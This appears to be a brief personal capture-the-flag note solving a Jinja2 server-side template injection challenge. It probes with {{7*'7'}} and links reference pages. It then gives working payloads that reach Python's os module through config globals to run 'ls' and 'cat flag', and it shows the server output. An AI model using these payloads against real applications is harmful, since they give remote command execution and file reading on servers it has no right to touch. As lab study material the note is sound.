content={{7*'7'}} 
```
                <!doctype html>
                <h1 style="font-size:100px;" align="center">7777777 </h1>
```

jinja2

https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html
https://portswigger.net/web-security/server-side-template-injection

{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}

```
                <!doctype html>
                <h1 style="font-size:100px;" align="center">__pycache__
app.py
flag
requirements.txt
</h1>
```

`{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}`

![[Pasted image 20250808175712.png]]

